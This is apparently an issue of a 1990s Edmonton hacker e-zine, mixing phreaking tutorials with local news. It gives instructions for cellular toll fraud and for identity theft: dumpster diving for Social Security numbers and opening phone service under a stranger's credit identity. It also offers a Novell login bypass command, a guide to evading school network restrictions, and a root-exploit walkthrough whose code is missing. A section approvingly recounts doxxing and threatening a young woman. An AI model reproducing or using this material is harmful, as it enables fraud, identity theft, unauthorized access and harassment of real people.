From Edmonton, Alberta.. kickin it in da 4o3!
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

April is past, and spring is here.  Right now is the perfect time
to unpack your old phreaking gear since the snow has melted away,
and the sun has started to shine.  Yes all is well in the 4o3 of
Alberta.  The only thing not well is that the last issue was issue
5, and all the headers said issue 4.  I don't know if any of the 
readers noticed this, but I did when I started to make issue 6. 
Oh well, on to bigger and better things.

If you browse the net, and have had a chance to drop by the page 
lately you would have seen that the page is being renovated.  I
am currently changeing around the format of the page, because the
previous one was a pitiful excuse for a page.  Expect to see greater
things to come.

Are any of the CHM readers good vga artists?  Well if you are do up
a few .gif's or .jpg's for the magazines webpage.  If we pick your
picture, your alias or name will be praised on the chm's website.
So no, you don't win a car or a harley.. unless you swipe one.

For best quality we suggest that you view this magazine with a
dos editor, notepad and other such windows programs SUCK, and do
not display many of the ascii characters that make up most of the
magazines graphics.  This should clear up a large number of winblows
complaints.  I have attached a dos viewer to the magazine, I find 
that it is extreamly useful, and its the best one I've seen out 
on the market.  The file is "L.COM", enjoy.

THERE ARE SEVERAL WAYS TO MAKE FREE CALLS WITH A CELLULAR PHONE THAT DOES NOT
HAVE SERVICE WITH THE HASSLE OF CLONING IT, OR IF YOU HAVE A PHONE THAT CAN'T
BE CLONED OR YOU DON'T WANT TO BUY THE EXPENSIVE EQUIPMENT REQUIRED, SO HERE
ARE A FEW WAYS TO DO IT FROM HOME WITH LITTLE RISK.

1.) AMERICAN ROAMING NETWORK

TO REACH THE AMERICAN ROAMING NETWORK (OR SOMETHING LIKE IT, DEPENDING ON
WHERE YOU ARE), PUT YOUR PHONE ON THE ALTERNATE CARRIER SIDE SO IT SAYS ROAM,
THEN DIAL 0 AND IT SHOULD TELL YOU YOUR CALL IS BEING FORWARDED.
AT THAT POINT YOU SHOULD BE CONNECTED TO AN AUTOMATED SYSTEM, FROM HERE YOU
HAVE A COUPLE OF BILLING OPTIONS.

TO USE A CREDIT OR CALLING CARD, YOU ENTER THE AREA CODE AND NUMBER YOU WANT
TO CALL; FOR A CALLING CARD YOU THEN ENTER THE CARD NUMBER AND PIN, FOR A
CREDIT CARD YOU THEN ENTER THE CARD NUMBER AND EXPERATION DATE, THEN THE ZIP
CODE OF THE BILLING ADDRESS. ARN TAKES MASTERCARD, AMERICAN EXPRESS, AND
MOST LOCAL AND LONG DISTANCE COMPANY CALLING CARDS. THEY SAY THEY DONT TAKE
VISA ANYMORE BUT I'VE GOTTEN THEM TO WORK ON THE AUTOMATED SYSTEM.

IF THE NUMBER YOU CALL IS BUSY OR DOESN'T ANSWER YOU CAN PRESS * AND THEN
EITHER LEAVE A MESSAGE THAT THE SYSTEM WILL DELIVER OR TRY ANOTHER NUMBER,
IF YOU WANT TO DIAL ANOTHER NUMBER YOU HAVE TO PUT IN THE ZIP CODE AGAIN
AFTER THE NEW NUMBER.

YOU CAN ALSO MAKE COLLECT AND 3RD PARTY BILLED CALLS BY DIALING 0 INSTEAD OF
THE NUMBER TO CALL WHEN YOU CONNECT TO ARN. YOU WILL BE SENT TO AN OPERATOR
, TELL THEM YOU WOULD LIKE TO PLACE A CALL. THEY WILL THEN ASK HOW YOU WOULD
LIKE TO BILL IT. YOU CAN SET UP AN LOCAL DIALUP VOICE MAIL BOX AND CHANGE
THE GREETING SO IT SOUNDS LIKE SOMEONE'S THERE TO ACCEPT THE CHARGES. THE
OPERATOR HAS TO READ A SCRIPT SO YOU HAVE TO ADJUST THE TIMING TO GET IT
JUST RIGHT.

ARN WILL NOT 3RD PARTY OR COLLECT BILL TO 800 NUMBERS, NOR WILL THEY PLACE
CALLS TO 800 NUMBERS CHARGED TO 3RD PARTY NUMBERS.

2.) SOCIAL ENGINEERING

ANOTHER WAY IS TO DIAL 611 AND TELL THE CUSTOMER SUPPORT PERSON THAT YOUR
HAVING TROUBLE GETTING THROUGH TO THE AREA YOUR TRYING TO CALL AND COULD
THEY TRY PLACE THE CALL FOR YOU. THIS WORKS ABOUT %50 OF THE TIME. IT HELPS
TO HAVE THE NAME AND CELL NUMBER OF SOMEONE WHO HAS SERVICE WITH THAT
PROVIDER IN CASE THEY ASK FOR IT. THEY MIGHT ASK FOR THE SOCIAL SECURITY
NUMBER TOO, SO BE PREPARED, DUMPSTER DIVING AT A CELL STORE IS THE EASIST
PLACE TO GET THAT INFO.

3.) SET UP SERVICE WITH SOMEONE ELSE'S INFO

THE BEST WAY, AND THE ONE I PERFER TO CLONING, IS TO GET SOMEONE ELSES
INFORMATION AND SET UP SERVICE. THE BEST PLACE TO GET THE INFORMATION YOU'LL
NEED IS FROM A PLACE THAT DOES CREDIT CHECKS, LIKE A BANK OR CAR DEALERSHIP.
MAKE SURE THEY HAVE A GOOD RATING, LIKE A, B, OR C, SO THEY WONT ASK FOR A
DEPOSIT.

YOU'LL NEED A NAME, ADDRESS, SOCIAL SECURITY NUMBER, DRIVERS LICENSE NUMBER,
AND WORK NUMBER.

YOU WILL ALSO NEED A CELL PHONE THAT IS NOT STOLEN. THEY WILL NOT ACTIVATE A
STOLEN PHONE, WHEN THEY TRIED THEY PUT ME ON HOLD AND CALLED THE PERSON
WHO'S PHONE I HAD AND THEN TOLD ME THE PERSON WANTED ME TO MAIL THE PHONE TO
THEM.

ALSO FIND AND WRITE DOWN THE ELECTRONIC SERIAL NUMBER, YOU'LL NEED THAT TOO.
YOU THEN NEED TO CALL A LOCAL CELL SERVICE PROVIDER (I.E. GTE MOBILNET,
CELLULAR ONE, BELL SOUTH MOBILITY, ETC.) AND TELL THEM YOU WANT TO SET UP
SERVICE ON A PHONE YOU HAVE. LET THEM TELL YOU ABOUT THE DIFFERENT SERVICE
PLANS AND PICK ONE. THEY WILL THEN ASK FOR YOUR "INFORMATION" AND ESN. THEN
THEY WILL ASK TO CALL YOU BACK WITH YOUR NEW CELL NUMBER, TELL THEM YOUR OUT
AND ASK FOR A NUMBER TO CALL THEM BACK AT. THEY WILL HAVE NO PROBLEM WITH
THIS. THEN CALL THEM BACK AND THEY WILL TELL YOU HOW TO PROGRAM YOUR NEW
NUMBER INTO YOUR PHONE. THEY MIGHT ALSO HAVE YOU PROGRAM IN A NEW SYSTEM ID
AND PAGING CHANNEL ETC, THIS IS NO BIG DEAL.

ALSO ASK WHEN THE BILLNIG CYCLE ENDS AND WHEN THE BILL IS SENT OUT, YOU WILL 
WANT TO STOP USING THIS NUMBER WHEN THE PERSON YOUR BILLING IT TO GETS THERE 
BILL. BE SURE TO GET CALL FEATURES LIKE 3-WAY AND CALL FORWARDING, THERE 
ALWAYS USEFULL TO HAVE.

I PERFER THIS TO CLONING BECAUSE ITS LESS WORRY AND HASSLE AND IT LASTS UP 
TO A MONTH.

  Note
ß------ß
Last issue we discussed sending messages in Novell Netware, well this issue
we will disscus a few "bugs" of Novell Netware v4, and how to access your
file manager for windows(when you think its been deleted).  If you read
phrack magazine you will notice that the bugs are similar to the bugs from
Line Noise in Phrack 50, why?  Cause thats were we got the bugs from.

Ü----------Ü
  The bugs
ß----------ß
Since the release of Novell NetWare v4, many systems have replaced
their old Novell software with this newer, more secure program; 
especially the schools here in the 4o3 alberta, canada.  Many of the
bugs, and security gliches in the previous versions have been removed,
and fixed.  But don't dismay, the bugs that were fixed have been replaced
with its own new batch of bugs(to add to the others that Novell couldn't
finish fixing).  The ability to use a packet sniffer to snag rconsole 
passwords still exists; you can get a number of packet sniffer programs
off the net, just do a webserch on Novell Hacking.  

The first bug is known to affect Novell 4.10, and is most likely present 
in other versions that support Directory Services.  The bug is just a 
combination of weak code in the LOGIN.EXE 4.12 and a default User object
in NDS=the user template file "USER_TEMPLATE".  LOGIN allows input fields
to be passed directly, instead of being filtered.

F:\>LOGIN SVR1/"USER_TEMPLATE"

That command should give you a generic level of user access, it depends on
the setup of the server.

I guess I might as well put the other part of the file in here as well, for
the system administrators that read the magazine.  I'll just insert the
rest of the artical here into the magazine:

The fix is simple.  Load SYS:\PUBLIC\NWADMIN.EXE and disable the user 
template's login.  But from now on, you will have to manually enable
login for any new User objects created in your tree.
 

[Bug 2]

This isn't a bug as much as a failed attempt to add security to a DOS file
system.  But since Novell touts (and teaches) it as a file system security
tool, it is worth addressing.
 
NetWare comes with a tool called FLAG, which is supposed to be the NetWare
equivalent of UNIX's chmod(), in that it controls file attributes for files
on local and NetWare file systems.  The problem lies in that Novell  
thought it would be neat to incorporate its tool into the world of DOS file 
attributes as well.  So they made FLAG alter DOS file attributes 
automatically to correspond with the new attributes installed by FLAG.  
This would've been cool, except that DOS's ATTRIB.EXE can also be used to 
change the DOS-supported file attributes set by FLAG.  (Archive, Read-only, 
 Hidden, and System, respectively)  And since ATTRIB doesn't reference NDS 
in any way, the problem is obvious;  A file that was marked Read-only by 
its owner, using FLAG, could be compromised by a user other than its owner,
with ATTRIB, and then altered or deleted.
 
There isn't an easy fix for something that is this broken, so it is 
simply recommended that you use IRFs (carefully) to designate file rights 
on your server.

Ü--------------Ü
  File Manager
ß--------------ß
To access file manager for windows we will have to run it from dos since
you can't use the "run"(File,Run) command from windows unless your school
system has Microsoft Office for Workgroups(tm).  If your school has Ms 
Office starting up when windows is run all you need to do is click on the
far right icon on the title bar.  This customizes MS Office, click on the
toolbar tab, and check the box that says "run".  From now on all you would
have to do is click on the [!] icon and type in c:\windows\winfile.exe 
(or where ever the windows directory is eg. f:\public\windows\winfile.exe).
If your school is like Queen Elizabeth high(Edmonton, Alberta), and dosn't
start up Office, but has it in the Microsoft office folder, all you need
to do is double click on the icon and customize the toolbar like above.

If your school dosn't have Office you'll have to do some shit through the
dos prompt.  For most schools like Queen E., Novell runs a supervisor made
menu prompting you for what programs you wish to run.  All you need to do
is hit the escape button(Esc), and select yes.  If your in Ross Shep. and
you get a menu that isn't blue/yellow, with options you select by using 
the up and down arrow keys, its not a novell menu.  For Ross Shep. students
you might get a prompt at the bottom (F:\>_) of your screens, its because
the menu is a batch file echoing a few sentences on the screen asking you
to run other batch files that run the programs.  You don't hit escape, but
switch to your hard drive, then run the command that takes you into windows
and runs file manager:

F:\> C:
C:\> CD WINDOWS
C:\WINDOWS> WIN WINFILE.EXE

For some systems the windows directory will be automatically in the computers
set "path", so all you will need to do is type "win winfile.exe" at any 
prompt and it should run windows, and then window's file manager.  All you 
will have to do is hit alt-tab and switch back and forth between file 
manager and any other programs your in so you don't get caught.

Thats all this time around, next month we will talk about screwing with
windows 95, which is a hell of a lot easier to hack then win 3.X and dos.

Have you ever got a shell account, or know of a lame ass I-Net server that 
you would love to have root on, but you'r not experenced enough to do it? 
Well here's the east way to do it, Ill even write it so the lamest fuck 
could do it.

1.  Ok the first thing you do is you get ahold of a linux shell account.  
    You can usally find one in #shells on efnet.
2.  Once you get your shell log on to it (telnet to it)
3.  Ok heres were the hacking comes in, at the bottom I have attached the 
    simple Mount exploit, it can be patched if the root is smart.  Type 
    "pico" in your telnet session on your shell.  Now Copy the exploit from 
    the bottom of this page into the telnet window, hit "ctrl x" and when it 
    says "save" type yes of corse.  Save it as "mount.c".
4.  Ok now the exploit is on the system, you just have to compile it, this 
    is quite easy.  From the shell enter the command "cc -o mount mount.c"
5.  K, your basicly done now just type "mount" and ta-da you now have root 
    access, you have access to all commands and files on the system!

Heres the exploit copy from this line down.

  Letter from Editor
ß--------------------ß
When I first started this magazine it was a fun thing to do, and
it sounded like a good idea.  Now after 6 issues it feels more of
a chore then fun.  If only I needed 1 hour of sleep to regenerate
myself I would be better off.  And if I had a good job I'd be able 
to buy myself that cgi adaptor and save even more time, since I 
wouldn't be hacking accounts and rerouting my calls through multiple 
countries, divirter after diverter, pbx after pbx, just to make one 
simple call to a voice brige.  Besides that I need to check my 
numerous email accounts, go on irc, check out shit on the net, 
work on the webpage, and finish reading my turbo pascal book.  
Ya, thats right!  I don't know little about programming, so sue me!

Well anyhow I know how I hate big long bullshit paragraphs in magazines,
so I'm gonna end it off right here.  Greetz to uglypig, Kaiser, kid, 
dadalis, gambit, IsolationX, ultram(long time no see), zoo, TheNarpet, 
nobody9, HaCkeDUp, crimson, jester, mr. nobody, mr. sonics, 
atlas girl, jnet, biohazard, and haywire.

                              Pipe Bomb Scare!
                            ß------------------ß
A very deadly pipe bomb was found outside the BonnieDoon Shopping
Center, in Edmonton, Alberta.  The bomb squad was called out to
defuse the bomb, and because of this security has been shapeing
up.  Police say the bomb looks like its been made by an ammatuer,
but its very deadly.  If it had gone off there would have been
many injuries, and possibly some deaths.  Police have no clues
to who might have planted the bomb, but they say the amount of
bombs being found is going up here in the city of Edmonton.

                            Drugs, Drugs, Drugs!
                          ß----------------------ß
Health officials, an various polititions want to legalize drugs(if 
you haven't heard yet).  Health officials say legalizing drugs will
stop most of the spread of AIDS, because ppl won't be shareing needles
so they don't get busted for carrying a used needle to a needle
exchange clinic.  Well to all the drug dealers their business
will get harder, and cheaper.  One thing is for sure, the dealers
won't want this law, bad for business.

                           Guns and the Election!
                         ß------------------------ß
During the weeks before the election, polititions are throwing
accusations at each other, and bitching about different political
differences.  
The Reform party of Canada wants to get rid of the gun law, that
makes you register your gun.  The NDP belive in rebolishing the
same law.  As for the Liberals, they want the gun law, and think
its a good idea.  Not only this but there is a law going through
parlament that will make you register your ammunition as well.  
How stupid can a law get?  Well its your decision on who you
will vote for, and its yours to make(if your old enough).  But I
say rebolish the damn gun law, and kill the ammunition control
bill as well.  
               
                         Northside Rumble of Death!
                       ß----------------------------ß
On april 15, shop keepers were horrified to see a group of about 20 
teens rumbleing in the food court, upper level by wisards castel, 
Northwood mall.  
This all started over a soccer game, one of the people was in the
arcade, doing arcade type stuff, when he was assaulted.  Well when 
his buddies got word of the attack they came to the mall, and beat
the shit(literally), out of the attackers and friends.  
Apparently the news is screwed up, and hard to understand.  Someone
was stabbed, this is either one of the attackers or the dude in the
arcade.  A chick got a chrome bat beat into the side of her head, blood
everywhere.  And a few others were taken to hospital with wounds, you 
know the type of wounds bats, hockey sticks, and other wepony type 
things make.  Others just got off with bloody noses, and bruses.  
The Police think this was racially motivated(isn't it always?),
just like the scene in West Edmonton Mall were two brothers were
stabbed, one died.  And maybe it was racial, Latin-americans vs.
the Italians.  We will never know unless we get a one on one 
interview with the bat weilding, stick slashing winners of this
major rumble of the month.  Boy Alberta is dead, this is acctually
big news.


                         Downtown, security shapeup
                       ß----------------------------ß
Here in edmonton, the downtown is no NewYork playground, but it has
its ugly faces.  The security at buildings like Scotia Place, Eatons 
Center, and various other large bussinesses downtown are shapeing up.

The local Edmonton Police department has setup a beeper system for the
downtown area.  Say a robery happened in a clothing shop at Eatons Center,
not only will the mall security be notified, but so will all other security
personal in the downtown area.  The clerk calls up a number and gives a
full discription of the person and what happened.  In the meantime the
operator is typing this all down in her little computer.  When finished
she sends out the message to all the security personal via their pagers.
This means, even though you have left Eatons Center, and entered Scotia
Place, thinking you can hide there, you are WRONG!  Your ass is in jail
just as soon as mr. dolittle sees your ass.

The city of Edmonton is planning on implementing this in every business
in the downtown area by October this year.  But first they are setting
it up in the large company buildings such as Eatons Center, Scotia Place,
etc.

                      DefCon lamer of the year awards!
                    ß----------------------------------ß
Just this past month a very lame chick came on defcon bullshitting
everyone.  One night she would come on asking what 5ess was, the
next she would come back and start bitching to everyone about what
she learned(which she twisted into bullshit!).  
After about a week of this bullshit(possibly less) the elites finally
went to war.  See she not only pissed off the lurkers that hung around
defcon, as well as some of the lamers, and some of the newbies, but
she pissed of the oldschool elites as well.  She also went into the
voice mail section and sent many boxes very rude messages, and this
even pissed off the people that have never even heard of her.  
Well finnaly this chick fucked herself over, she challenged defcon
to find her.  So my good friend Kaiser called up BeeHive Telecommunications
and got her doc's, found other phone lines that go to her house, 
her name, where she lived, when she got her garbage picked up, what
she got for her grade one report card, etc.. and posted all this 
information on the defcon voice bbs.
Many a time various defcon callers three-wayed defcon to her house, and
brought her to tears.  Some others went down to her school in New Jersey
and threatened her.  All I will say is that we haven't heard from her
on defcon ever since.  
So the DefCon LAMER OF THE YEAR AWARD GOES TO.. HACKER QUEEN!!  May she
never rest from the prank calls, and be for ever in dept to the long
distance phone companies.

                             On Pevious Articals
Ü--------------------------------------------------------------------------Ü
                     
                     Cell fone Setup, and how its done
                   ß-----------------------------------ß
Last month this artical was in the magazine, but it wasn't done.  I just
realized that the artical was incomplete when I was going through the
magazine and setting up issue 6.  So here is the complete artical, it wasn't
too much incomplete, so all it really dose is clear up some misunderstand-
ings:

This is for all of you people that don't mind paying for a cell, but would
still go out and beige box to call long distance; or this would be for
someone that would like to find out some info on setting up a cell
and how its done(like me).
First you can buy a cell, or rent one from the phone company.  Cells usually
cost between $49-$1700, and the cells can be activated on the spot if it was
bought from an authorized telus dealer.  
Payment plans range from $29 to $200, depending on wether you are renting
a cell or are using a bought cell.  
The Telus people won't give anyone a cell, because once you get it 
activated there is no minimum spending.  So Telus dose a credit check
on you, to make sure you'll pay the bills.  If they don't find anything on
you they will ask for a job, call your employer and get info that way.
If you live in the 403 you can get more information at:

(403)423-2500(Some Cell store)
(403)477-3700(Edmonton cellular; Kingsway)
(403)487-8876(Jonstons Cellular)
(403)444-8880(WestCo Cellular)

If I were getting a cell through my company I would get a cell thats easy
to reprogram.  So even though the cell looks nice, and the company is 
paying for it, you should plan ahead for when you leave the company, or
it goes bankrupt.  Since they don't make Oki900's anymore, try to get one
similar to it.  If your unsure about what cells are compatable with OKI900
chips you can check out the Dr. Who's radiophone page at www.l0pht.com for
all your reprogramming needs.
